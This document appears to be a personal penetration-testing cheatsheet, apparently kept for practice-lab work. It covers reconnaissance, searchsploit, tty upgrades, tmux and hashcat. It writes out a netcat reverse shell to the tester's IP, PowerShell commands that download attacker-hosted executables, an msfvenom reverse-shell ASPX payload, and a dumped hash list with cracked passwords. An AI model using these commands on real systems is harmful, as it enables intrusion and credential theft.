# Cheatsheet
# Discovery
## nmap
```bash
# Shows version information
nmap -sC -sV -oA <name> <ip>
```
## burp
Proxy localhost port to remote port
![](2020-12-16-11-09-48.png)
![](2020-12-16-11-10-08.png)

## WebDAV
```bash
cadaver <ip>
davtest <url> # does not work with any other port than 80 for some reason
```

# Exploiting
## exploit-db
```bash
# local exploit-db
searchsploit "service name"
# show code of exploit
searchsplot -x <path number>
# mirror it to current dir
searchsplot -m <path number>
```


## Reverse shell

Listen locally with nc
```bash
# n is important!
nc -lvnp 4444
```

Remote (Windows):
```
nc.exe -e cmd.exe <local ip> 4444
```

Python web server and download with PS

```
python3 -m http.server 80
powershell Invoke-Webrequest -OutFile C:\temp\nc.exe -Uri http://10.10.14.116/nc.exe
powershell (new-object System.Net.WebClient).Downloadfile('http://10.10.14.16:8000/rev.exe', 'rev.exe')
```

```
# Windows nc reverse shell without meterpreter (not staged)
msfvenom -p windows/shell_reverse_tcp
```



## Interactive terminal

Using Python for a pseudo terminal

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

## Sharing files
```
python3 -m http.server 8000
```



# Tools
https://github.com/infodox/python-pty-shells
## vim save with sudo
```
:w !sudo tee %
```
## tmux
```bash
# new session
tmux new -s <name>
# list
tmux ls
# attach
tmux attach -t <name>

## tmux options
run-shell /opt/tmux-logging/logging.tmux
```
prefix key: ctrl+b
|Purpose|Prefix|
|-|-|
|c|new tab|
|[0-9]|go to tab n|
|d|detach|
|%|vertical split|
|"|horizontal split|
|arrow keys|move to pane|
|z|toggle zoom into pane|
|x|kill pane|
|$|rename session|
|,|rename tab|
|space|cycle looks|
|t|show time|
|:set -g mouse on|enable mouse|

## msfvenom
Payload generator
example aspx generator for reverse shell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f aspx > shell.aspx
```

## msfconsole
```bash
# Generic reverse shell for use with the payload.
use exploit/multi/handler

# Suggest working exploits for detected version
use post/multi/recon/local_exploit_suggester
```

# Detection evasion
## Linux
`/dev/shm` is a ramdisk -> not saved for ever

# Note keeping
Cherry Tree - Hierarchical tool with code highlight and screen capture
ctrl+shift+prtscr for screenshot selection

# Resources
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

# Cryptography
http://rumkin.com/tools/cipher/
https://gchq.github.io/CyberChef/

## Password cracking
### hashcat
LM hash with hashcat windows
```bash
# grandma_lm.txt:
    # Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
    # ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::
    # Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    # IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::
    # IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::
    # Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::
    # SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::
hashcat -a 3 -m 3000 grandma_lm.txt
hashcat -a 3 -m 3000 grandma_lm.txt --show
# c74761604a24f0dfd0a9ba2c30e462cf:IHRNWUIENDKE
# aad3b435b51404eeaad3b435b51404ee:
# f927b0679b3cc0e192410d9b0b40873c:KEHITBIJJFDE
# aad3b435b51404eeaad3b435b51404ee:
# returned the lm hashes, we need to know upper/lowercase though

hashcat -a 0 -m 1000 grandma_lm.txt gma.dict -r rules/toggles5.rule --show
# d6908f022af0373e9e21b8a241c86dca:IhrNwuiEndkE
```

https://crackstation.net/

# Paths to useful directories
Windows binaries: /usr/share/windows-binaries
Seclists: /usr/share/seclists



<script id="asciicast-qvjqOSa14AHoN5IQgdKUVeshc" src="https://asciinema.org/a/qvjqOSa14AHoN5IQgdKUVeshc.js" async></script>